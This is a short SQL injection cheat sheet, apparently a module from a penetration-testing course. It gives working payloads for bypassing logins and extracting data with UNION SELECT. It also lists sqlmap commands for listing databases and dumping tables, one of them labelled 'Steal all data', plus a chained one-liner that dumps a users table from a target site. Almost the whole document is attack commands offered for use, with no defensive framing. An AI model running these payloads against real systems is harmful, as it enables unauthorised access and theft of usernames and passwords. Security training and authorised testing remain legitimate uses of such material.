# Module 08: SQL Injection Commands

### 1. Manual Payloads (The Basics)
| Goal | Payload | Explanation |
| :--- | :--- | :--- |
| **Bypass Login** | `' OR 1=1 --` | Forces the query to be True. |
| **Test for SQLi** | `'` | A single quote often triggers a database error. |
| **Find Columns** | `' ORDER BY 1 --` | Increments number until an error occurs to find column count. |
| **Extract Data** | `' UNION SELECT 1,2,user() --` | Dumps the current database user. |

### 2. SQLMap: The Power Tool
`sqlmap` is the industry standard for automating SQLi.

| Command | Description | Use Case |
| :--- | :--- | :--- |
| `sqlmap -u <url>` | Scan a URL for SQLi | Initial detection. |
| `sqlmap -u <url> --dbs` | List all databases | Finding the target database. |
| `sqlmap -u <url> -D <db> --tables` | List tables in a DB | Finding the `users` or `config` table. |
| `sqlmap -u <url> -D <db> -T <table> --dump` | Steal all data | Extracting usernames and passwords. |
| `sqlmap -r request.txt` | Scan based on a Burp request | Testing POST requests or headers. |

### The "SQLi Chain" (Example):
Identify a vulnerable parameter $\rightarrow$ Find DB name $\rightarrow$ Dump passwords:
```bash
sqlmap -u "http://target.com/product.php?id=1" --dbs && sqlmap -u "http://target.com/product.php?id=1" -D target_db --tables && sqlmap -u "http://target.com/product.php?id=1" -D target_db -T users --dump
```
